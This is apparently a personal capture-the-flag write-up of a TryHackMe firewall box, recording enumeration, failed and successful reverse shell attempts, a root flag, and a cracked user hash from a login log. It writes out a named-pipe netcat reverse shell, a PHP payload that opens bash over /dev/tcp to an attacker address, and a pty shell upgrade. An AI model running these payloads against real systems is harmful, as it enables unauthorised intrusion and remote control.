# First Contact

This time I thought would continue black-boxing from this point:

Enumerate box
```bash
which nc
/usr/bin/nc

which python3
/usr/bin/python3

id
uid=0(root) gid=0(wheel) groups=0(wheel)
```
No socat unfortunately, but hopeful I will hopeful use it later.
Check the tmp directory exists and its contents
![fw-tmp-dir](Screenshots/fw-ls-la-tmp)
Executed a Bash shell, change $IP and $PORT to Kali VM with listener listening:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
chmod +x /tmp/f
/tmp/f
```

![denied1](Screenshots/fw-Shell-denied.png)

I tried also:
```bash
chmod 777 /tmp/f

nc -lvnp 8080 # only got usage prompt so no execution:
usage: nc [-46DdEFhklNnrStUuvz] [-e policy] [-I length] [-i interval] [-O length]
	  [-P proxy_username] [-p source_port] [-s source] [-T ToS]
	  [-V rtable] [-w timeout] [-X proxy_protocol]
	  [-x proxy_address[:port]] [destination] [port]
```

The I tried a pentest monkey webshell seeing as it is a website of sorts.

```bash
chmod +x /tmp/monkey.php
/tmp/monkey

/tmp/monkey.php: cannot open ?php: No such file or directory
/tmp/monkey.php: //: Permission denied
/tmp/monkey.php: 3: Syntax error: "(" unexpected
```

Also it uploaded to /tmp, not /var/www/html/. So then I tried:

```php
"<?php exec("/bin/bash -c 'bash -i > /dev/tcp/$ip/$port 0>&1'");?>"
```

![denied2]((Screenshots/fw-phpExecDenied.png)

Then tried putting the pentest monkey code into the execute php command changed the I provided IP address of the Kali VM on THM to its inet IP not generic IP used in reverse shells. 

![root-fw](Screenshots/fw-initial-root.png)

And the flag

![root-fw](Screenshots/fw-root-flag.png)

Tried stablising with:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

But it broke, tried again:

![root-stab](Screenshots/fw-shell-stab-broke.png)



![root-log](Screenshots/fw-find-logs.png)

Why would you have login.log

HumphreyW:1c13639dba96c7b53d26f7d00956a364

![cracked](Screenshots/fw-humpreyw-cracked.png)

Note that if this was an actual Pentest that permission to use third party Hashcracking would have to be within scope due to handing over confidential data to an outside source in the form of a hash. If that third was compromised morally or in terms of their security then traffic data could be linked to the hash.

